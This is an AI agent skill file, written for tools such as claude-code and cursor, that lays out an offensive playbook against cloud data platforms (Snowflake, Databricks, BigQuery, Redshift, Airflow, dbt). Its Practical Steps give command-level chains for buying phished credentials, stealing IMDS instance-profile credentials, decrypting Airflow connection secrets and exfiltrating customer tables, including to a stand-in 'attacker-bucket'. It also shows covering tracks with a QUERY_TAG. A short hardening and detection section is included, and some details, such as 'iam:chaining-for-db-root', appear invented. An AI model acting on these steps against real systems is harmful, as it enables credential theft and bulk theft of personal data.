---
name: data-platform-attack
description: "Attacks against cloud data platforms and analytics pipelines — Snowflake, Databricks, BigQuery, Redshift, dbt, Apache Airflow, and lakehouse architectures. Covers identity-based breaches (no perimeter), warehouse SQL injection at scale, IAM privilege escalation, secrets in DAGs, notebook code injection, and cross-tenant data exfiltration. Distinct from database-attack (protocol-level RDBMS) and cloud-security (broader CSP control plane)."
origin: openclaw
version: "0.1.40"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: data-platform
  tool_count: 14
  guide_count: 2
  mitre: "TA0006-Credential Access, T1078-Valid Accounts, T1213-Data from Information Repositories"
---

# Data Platform Attack

> **Supplementary Files**:
> - `payloads.md` — Attack payloads and commands organized by platform: Snowflake, Databricks, BigQuery, Redshift, dbt, Airflow, Spark, and lakehouse cross-platform attacks
> - `test-cases.md` — 18 structured test cases covering reconnaissance, identity abuse, SQL injection at warehouse scale, secrets harvesting, notebook injection, and exfiltration
> - `guides/data-platform-attack-playbook.md` — End-to-end playbook with engagement scoping, lab setup, reconnaissance methodology, identity abuse workflows, SQLi-at-scale patterns, exfiltration tactics, and blue-team detection engineering
> - `guides/real-world-incident-case-studies.md` — Eight case studies including the 2024 Snowflake/Lapsus$/Scattered Spider breach, Mandiant UNC5537, Databricks notebook abuse, Airflow DAG secret harvesting, and dbt CI token theft

## Summary

This skill targets modern cloud data platforms — warehouses, lakehouses, orchestration layers, and transformation pipelines — where the boundary between analytics and production has collapsed. Attackers no longer tunnel through database listeners; they walk in through SSO, service tokens, and CI/CD pipelines.

**Tools**: snowsql, databricks-cli, gcloud (BigQuery), aws cli (Redshift/Athena), bq, psql (Redshift), dbt, airflow-cli, spark-sql, sqlmap, pacu, enumerate-iam, m365 dataset scrapers

**Domain**: data-platform

**MITRE ATT&CK**: TA0006 Credential Access · T1078 Valid Accounts · T1213 Data from Information Repositories · T1552 Unsecured Credentials

## Description

Attacks against cloud data platforms and analytics pipelines — Snowflake, Databricks, BigQuery, Redshift, dbt, Apache Airflow, and lakehouse architectures. These platforms concentrate an organization's most valuable data behind identity boundaries rather than network boundaries, so the primary attack surface is **identity abuse, misconfigured public endpoints, secrets embedded in pipelines, and SQL injection scaled across warehouses that contain every production table**.

This skill is distinct from:
- **database-attack** — which targets RDBMS at the protocol/listener level (Oracle TNS, MySQL socket, Redis/MongoDB unauth) behind a network perimeter
- **cloud-security** — which targets CSP control planes (EC2/IAM/S3) broadly
- **container-security** — which targets OCI/K8s

Where database-attack asks "can I reach the listener?", data-platform-attack asks "given that the warehouse is internet-reachable by design and uses SSO/SAML, how do I turn a phished engineer into 4TB of exfiltrated customer records?"

Coverage includes: Snowflake account enumeration (origins + `ORGNAME-USERNAME`), key-pair auth abuse, SCIM provisioning gaps, network policies as the only firewall, Databricks workspace takeover via account-console tokens and PATs, BigQuery IAM abuse and authorized datasets, Redshift IAM chaining, dbt CI/CD token theft, Airflow DAG secret harvesting, Spark/Livy code injection, notebook RCE via `%sh`/`%scala`, lakehouse delta-layer corruption, and cross-tenant exfiltration via shared shares/marketplace listings.

## Use Cases

- **Snowflake account reconnaissance** — enumerate account URLs (`xy12345.snowflakecomputing.com`), confirm account existence via SAML IdP redirect, identify org-name formats
- **Snowflake identity abuse** — phished user → no MFA enforcement → direct login → data exfiltration via `COPY INTO s3` or external stages (Mandiant UNC5537 / 2024-06 breach pattern)
- **Databricks workspace takeover** — leaked PAT or account-console token → enumerate clusters, notebooks, and secrets scopes → pivot to AWS/GCP via instance profiles
- **Airflow DAG secrets harvesting** — read-only access to metadata DB or DAG repo → extract AWS/Azure/GCP credentials from Connections, Variables, and task code
- **dbt CI token theft** — compromising the CI runner → exfiltrate the `DBT_CLOUD_API_TOKEN` or `SNOWFLAKE_PASSWORD` from environment → impersonate service accounts
- **BigQuery authorized-dataset abuse** — accept inherited grants from `analyst_group` → run `bq query --use_legacy_sql=false` across federated datasets
- **Redshift IAM chaining** — `redshift:GetClusterCredentials` → `redshift:ExecuteQuery` → escalate to `iam:chaining-for-db-root`
- **Notebook code injection** — supply malicious CSV/Parquet → Databricks autoloader ingests → `%python` cell hijacks cluster
- **Lakehouse delta corruption** — tamper with `_delta_log` JSON via compromised service principal → silent data drift
- **Cross-tenant exfiltration** — abuse Snowflake Secure Data Sharing / Databricks Marketplace listings to exfiltrate to attacker-controlled account

## Differentiation from Adjacent Skills

| Skill | Primary surface | Boundary type | Typical entry |
|---|---|---|---|
| `database-attack` | RDBMS listener (Oracle TNS, MySQL socket, Redis) | Network perimeter | Brute force on listener |
| `cloud-security` | CSP control plane (EC2, IAM, S3, Azure RM) | Cloud IAM | IAM enumeration |
| `data-platform-attack` (this) | Warehouse / lakehouse / orchestrator | Identity perimeter | Phishing, token leak, public endpoint |
| `container-security` | OCI, Kubernetes, containerd | K8s RBAC, pod identity | Container escape |
| `ai-agent-framework-attack` | LLM agent runtime | Agent prompt / tool surface | Indirect prompt injection |
| `supply-chain-security` | SBOM, package registry, build pipeline | CI/CD pipeline | Dependency confusion |

## Core Tools

### Snowflake
- **snowsql** — official CLI; use with `SNOWFLAKE_ACCOUNT`, `--authenticator=externalbrowser` for SSO
- **snowflake-connector-python** — script recon and bulk queries
- **snowflake-labs** GitHub repos — reference payloads (account enumeration, role mapping)

### Databricks
- **databricks-cli** — workspace, DBFS, secrets, clusters APIs
- **databricks-sql-cli** — direct warehouse SQL via thrift
- **azure-databricks-tools** — workspace enumeration for Azure deployments

### BigQuery / GCP
- **bq** — query, dataset, table enumeration
- **gcloud** — IAM, service-account impersonation, ` bq get-iam-policy`
- **enumerate-iam** — brute-force `gcloud` permissions on a token

### Redshift / AWS
- **aws cli** — `redshift-data`, `redshift-serverless`, `athena`
- **psql** — direct cluster connection after `get-cluster-credentials`
- **pacu** — automates Redshift-to-IAM chaining

### dbt / Airflow
- **dbt** (CLI) — manifest exploration after token theft
- **airflow-cli** — DAG, connection, variable enumeration
- **astronomer-cosmos** — DAG parser to identify secrets in code

### General
- **sqlmap** — warehouse SQLi (slower; use `--dbms=postgres` for Snowflake/Redshift wire protocols)
- **pacu** — AWS-side escalation from data platform pivot
- **scattered-spider-style** OSINT — Snowflake account enumeration via GitHub dorks and public SSO portals

## Methodology

### Phase 1 — Reconnaissance (Account & Tenant Discovery)
- Snowflake account URL enumeration via org patterns (`acme-orgname.snowflakecomputing.com`)
- SAML IdP fingerprinting to confirm account existence
- GitHub dorks: `"snowflake_account"`, `"snowflakecomputing.com"`, `dbt_profiles.yml` blobs
- Databricks workspace URL patterns (`adb-<digits>.<azuredatabricks.net | aws>.net`)
- BigQuery dataset shadows (`publicdata.googleapis.com`, `bigquery-public-data`)
- Airflow webserver fingerprinting via `/login/` and DagBag banner
- dbt Cloud job logs leaked in CI artifacts

### Phase 2 — Identity & Authentication Abuse
- Snowflake: phished user via SSO → no network policy → direct login → role enumeration (`use role accountadmin`)
- Snowflake: SCIM provisioning mismatch → `AAD_TO_SNOWFLAKE_ROLE_MAPPING` allows lateral to accountadmin
- Snowflake: key-pair auth abuse from leaked private key in CI logs
- Databricks: PAT leak in Notebook export, MLflow artifact URL, or cluster log
- Databricks: account-console token (admin only) → workspace admin bypass
- BigQuery: service-account key leak → `bq query --impersonate-service-account=`
- Airflow: Connection passwords in metadata DB (`fernet_key` extraction if weak/leaked)
- dbt: `DBT_CLOUD_API_TOKEN` in CI env → enumerate jobs → fetch `dbt_cloud_service_token_`

### Phase 3 — Warehouse SQL Injection at Scale
- Find BI dashboards / embedded analytics endpoints that fan into Snowflake/BigQuery
- Inject via filter parameters, date selectors, dimension values
- `UNION SELECT` across `SNOWFLAKE.ACCOUNT_USAGE` for global recon
- BigQuery: information_schema enumeration via `EXCEPT` interleaving
- Pivot to `COPY INTO @external_stage` (Snowflake) or `EXPORT DATA OPTIONS(uri='gs://...')` (BigQuery) for exfil

### Phase 4 — Pipeline & DAG Exploitation
- Airflow Connections metadata DB exposure → harvest AWS keys, Slack webhooks, Snowflake passwords
- Airflow Variables leak → CI/CD tokens, Jira API keys
- dbt `profiles.yml` in CI artifact → Snowflake/BigQuery/Redshift password
- dbt model code → identify tables with secrets (`SELECT * FROM dbt_audit.users`)
- Spark/Livy code injection via `%sh` or `%scala` in shared notebooks
- Databricks notebook `%python` cell → AWS IMDS → instance-profile theft

### Phase 5 — Notebook & Compute RCE
- Databricks: upload malicious `.whl` to cluster init script → cluster-wide RCE
- Databricks: `%scala` cell → `dbutils.notebook.exit` chain → secret-scope read
- Synapse: Spark pool → IMDS → subscription-wide lateral
- BigQuery remote functions → ARN of attacker Lambda → arbitrary execution
- Airflow KubernetesExecutor → pod spec tampering → cluster node takeover

### Phase 6 — Lakehouse & Delta Layer Attacks
- Delta Lake `_delta_log` JSON tampering via compromised service principal
- Iceberg metadata manipulation (`METADATA_LOG` replay attack)
- Hudi timeline corruption → silent data drift
- Lakehouse federation: abuse cross-engine views to read external catalog tables

### Phase 7 — Cross-Tenant & Exfiltration
- Snowflake Secure Data Sharing: lister account → exfil via shared-to-attacker database
- Databricks Marketplace: publish a dataset with embedded webhook on `READ_API`
- BigQuery Authorized Views: chain from `dataset:public_view` → `dataset:private_table`
- Exfil via `COPY INTO @s3_external_stage`, `EXPORT DATA OPTIONS`, `UNLOAD`, `bq extract`
- Exfil rate-bypass via partition-pruned queries over many small result sets
- Anti-detection: `ALTER SESSION SET QUERY_TAG='daily-refresh'` to blend with jobs

## Defense Perspective

### Core Principles
1. **Identity is the new perimeter** — assume the warehouse is internet-reachable; enforce MFA, SCIM role mapping, and conditional access
2. **Network policies, not firewalls** — Snowflake network policy = allowlist + blocklist of CIDRs; apply per-user, per-role
3. **Tri-partition of duties** — separate producer, consumer, and auditor roles; never let a producer grant itself accountadmin
4. **Secrets never in DAGs** — use Airflow Connections backed by AWS Secrets Manager / HashiCorp Vault; never `Variable.set("AWS_KEY", ...)`
5. **Detect by behavior, not by signature** — large `COPY INTO`, unfamiliar `QUERY_TAG`, new geography, unusual role escalation are the high-signal events

### Detection Engineering
- Snowflake: `SNOWFLAKE.ACCOUNT_USAGE.ACCESS_HISTORY` for direct object access tracing
- Snowflake: alerts on `SESSION_CLIENT_TYPE` changes, new `AUTHENTICATION_METHOD`
- BigQuery: Cloud Audit Logs `bigquery.googleapis.com/DataRead` with `jobInsert` filtering
- Airflow: DAG spec diffs in CI, alert on `Variable.set` in scheduler logs
- Databricks: cluster-log forward to Splunk; alert on `%sh` cells touching IMDS
- Universal: alert on `COPY INTO @external_stage` where stage owner ≠ workload identity

### Hardening Checklist
- [ ] Enforce MFA (preferably phishing-resistant: WebAuthn, YubiKey) on all data platform users
- [ ] Apply network policies to every Snowflake account; deny non-corporate CIDRs
- [ ] Use SCIM with explicit deny-mapping; never auto-grant accountadmin
- [ ] Databricks: rotate PATs quarterly; prefer OAuth over PAT
- [ ] Airflow: back Connections with secret manager; rotate `FERNET_KEY`
- [ ] dbt: use short-lived tokens in CI; rotate `DBT_CLOUD_API_TOKEN` on personnel change
- [ ] BigQuery: enforce `authorizedViews` + `authorizedDatasets` + condition bindings
- [ ] Lakehouse: write-audit-log on `_delta_log` for every committed version
- [ ] Enable cloud platform's UEBA / GuardDuty / Microsoft Defender for Data

## Practical Steps

### Snowflake — UNC5537 Style Entry
1. Confirm target account: `curl -I https://acme.snowflakecomputing.com` → 302 to Okta/Azure
2. Purchase phished credentials on access broker marketplaces or use leaked cookie session
3. If no MFA enforced: `snowsql -a acme -u phished_user --authenticator=externalbrowser`
4. Enumerate: `SHOW ROLES;`, `SHOW GRANTS;`, `USE ROLE ACCOUNTADMIN;` (if SCIM mis-mapped)
5. Pivot to exfil: `COPY INTO @my_external_stage FROM customers;`
6. Cover tracks: `ALTER SESSION SET QUERY_TAG='nightly_ingest';`

### Databricks — PAT to AWS
1. Obtain leaked PAT from CI logs or notebook export
2. `databricks clusters list` → identify cluster with instance profile ARN
3. `databricks secrets list-scopes` → enumerate and dump via ACL flaws
4. Run `%python` cell: `requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/...')`
5. Use stolen instance profile creds via `aws s3 ls` against the customer bucket

### Airflow — Connection Harvest
1. Obtain read access to Airflow metadata DB (often backed by RDS)
2. `SELECT conn_id, conn_type, password FROM connection;` (encrypted with `FERNET_KEY` from env)
3. Pull `FERNET_KEY` from `AIRFLOW__CORE__FERNET_KEY` env or config file
4. Decrypt all connections offline
5. Pivot: use Snowflake connection creds to authenticate via `snowsql`

### BigQuery — Authorized Dataset Abuse
1. Service-account key leak → `gcloud auth activate-service-account --key-file=sa.json`
2. `bq ls --projects=customer-prod` → enumerate datasets
3. `bq show --format=prettyjson dataset.table` → schema recon
4. `bq query --use_legacy_sql=false 'SELECT * FROM \`customer-prod.pii.users\` LIMIT 1000'`
5. Exfil: `bq extract --destination_format=CSV 'customer-prod.pii.users' gs://attacker-bucket/users.csv`

### Redshift — IAM Chaining
1. Compromise a low-priv role with `redshift:GetClusterCredentials`
2. Connect via psql: `psql -h cluster.x.redshift.amazonaws.com -u db_user`
3. Read `stv_session_activity` for lateral recon
4. Identify tables with secrets (`pg_catalog.pg_shadow`)
5. Pivot: enumerate AWS permissions of the cluster's IAM role via `redshift-data:ExecuteStatement`

## Cross-References
- `skills/database-attack/SKILL.md` — protocol-level RDBMS attacks (Oracle TNS, MySQL socket)
- `skills/cloud-security/SKILL.md` — broader CSP control plane attacks
- `skills/ai-agent-framework-attack/SKILL.md` — when LLM agents become the data platform consumer
- `skills/secret-discovery/SKILL.md` — secrets discovery techniques applicable to DAGs and notebooks
- `skills/persistence-attacks/SKILL.md` — Snowflake persistent query-tag evasion
- `skills/pentest-reporting/SKILL.md` — reporting templates for data-breach simulations

## References

- Mandiant — *Cloud Threat Report: UNC5537 Snowflake Campaign* (2024-06)
- Snowflake Security Trust Center — *Information on Threat Campaign* (2024-06)
- Databricks — *Security Best Practices for Workspace Administration* (2024)
- Google Cloud — *BigQuery Authorized Datasets and Views* (2024)
- MITRE ATT&CK — *T1213 Data from Information Repositories*, *T1078.004 Cloud Accounts*, *T1552.007 Container and Cloud Instance Credentials API*
- dbt Labs — *Security Best Practices for CI/CD Token Management* (2024)
- Apache Airflow Security Guide — *Connections, Secrets Backends, FERNET_KEY* (2024)
